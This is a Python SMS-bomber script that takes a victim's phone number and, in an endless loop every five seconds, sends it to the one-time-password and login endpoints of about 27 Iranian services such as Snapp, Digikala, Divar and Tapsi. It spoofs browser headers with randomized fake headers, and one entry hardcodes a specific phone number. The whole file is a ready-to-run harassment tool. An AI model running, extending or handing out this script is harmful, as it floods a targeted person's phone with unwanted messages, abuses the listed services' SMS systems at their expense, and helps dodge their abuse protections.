import requests
from alive_progress import alive_bar
from fake_headers import Headers
import time

headers = Headers()


def send_request(api_name, api_url, data):
    generated_headers = headers.generate()

    try:
        response = requests.post(api_url, headers=generated_headers, json=data)
        response.raise_for_status()
        return True, f"\033[92m[+] {api_name}:\033[0m OK"
    except requests.exceptions.RequestException as e:
        return False, f"\033[91m[-] {api_name}:\033[0m Failed - {e}"


def main():
    phone_number = input("\033[94mEnter the phone number:\033[0m ")

    apis = [
        {
            "name": "Snapp V1",
            "url": "https://api.snapp.ir/api/v1/sms/link",
            "data": {"phone": phone_number},
        },
        {
            "name": "Snapp V2",
            "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
            "data": {"cellphone": phone_number},
        },
        {
            "name": "Achareh",
            "url": "https://api.achareh.co/v2/accounts/login/",
            "data": {"phone": f"98{phone_number[1:]}"},
        },
        {
            "name": "Zigap",
            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
            "data": {"phoneNumber": f"+98{phone_number[1:]}"},
        },
        {
            "name": "Jabama",
            "url": "https://gw.jabama.com/api/v4/account/send-code",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Banimode",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": phone_number},
        },
        {
            "name": "Classino",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Digikala V1",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {"username": phone_number, "otp_call": False},
        },
        {
            "name": "Digikala V2",
            "url": "https://api.digikala.com/v1/user/forgot/check/",
            "data": {"username": phone_number},
        },
        {
            "name": "Sms.ir",
            "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
            "data": phone_number,
        },
        {
            "name": "Alibaba",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": phone_number[1:]},
        },
        {
            "name": "Divar",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": phone_number},
        },
        {
            "name": "Sheypoor",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": phone_number},
        },
        {
            "name": "Bikoplus",
            "url": "https://bikoplus.com/account/check-phone-number",
            "data": {"phoneNumber": phone_number},
        },
        {
            "name": "Mootanroo",
            "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
            "data": {"PhoneNumber": phone_number},
        },
        {
            "name": "Tap33",
            "url": "https://tap33.me/api/v2/user",
            "data": {"credential": {"phoneNumber": "09333277301", "role": "BIKER"}},
        },
        {
            "name": "Tap33",
            "url": "https://tap33.me/api/v2/user",
            "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}},
        },
        {
            "name": "Tapsi",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
                "otpOption": "SMS",
            },
        },
        {
            "name": "GapFilm",
            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
            "data": {"Type": "3", "Username": phone_number[1:]},
        },
        {
            "name": "IToll",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Anargift",
            "url": "https://api.anargift.com/api/v1/auth/auth",
            "data": {"mobile_number": phone_number},
        },
        {
            "name": "Nobat",
            "url": "https://nobat.ir/api/public/patient/login/phone",
            "data": {"mobile": phone_number[1:]},
        },
        {
            "name": "Lendo",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Hamrah-Mechanic",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {"PhoneNumber": phone_number},
        },
        {
            "name": "Abantether",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": phone_number},
        },
        {
            "name": "OKCS",
            "url": "https://my.okcs.com/api/check-mobile",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Tebinja",
            "url": "https://www.tebinja.com/api/v1/users",
            "data": {"username": phone_number},
        },
    ]

    while True:
        with alive_bar(len(apis), theme="smooth") as progress_bar:
            for api in apis:
                success, message = send_request(api["name"], api["url"], api["data"])
                progress_bar()
                print(message)

        time.sleep(5)


if __name__ == "__main__":
    main()
